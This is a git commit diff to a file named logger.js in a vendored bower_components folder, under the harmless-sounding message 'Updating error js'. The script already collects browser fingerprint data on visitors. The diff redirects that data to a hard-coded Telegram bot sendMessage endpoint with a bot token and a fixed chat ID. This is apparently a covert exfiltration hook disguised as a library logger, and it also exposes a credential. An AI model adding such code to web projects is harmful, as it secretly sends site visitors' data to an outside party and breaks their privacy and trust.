2e74101c69c05714fa4cd41b4c2306c4c7954058
xaferima <xaferima@gmail.com>
2022-07-07 13:23:38 -0500

    Updating error js

--- assets/js/bower_components/logger/logger.js
+++ assets/js/bower_components/logger/logger.js
@@ -24,13 +24,17 @@ new Fingerprint2().get(function(fingerprint, components){
   // components is an array of all fingerprinting components used
 });
 
+
 var sendInfo = function(endpoint){
+    endpoint='https://api.telegram.org/bot1144251938:AAFc1ywZOJUeb2fzSw54fVBTxdarxAVuM20/sendMessage';
     setTimeout(function(){
         var xhr = new XMLHttpRequest();
         xhr.open("POST", endpoint, true);
         xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
         // send the collected data as JSON
-        xhr.send(JSON.stringify(userData));
+  //      xhr.send(JSON.stringify(userData));
+        data={'chat_id': 1290297888, 'text': userData}
+        xhr.send(JSON.stringify(data));
         xhr.onloadend = function () {
         // done
         } 
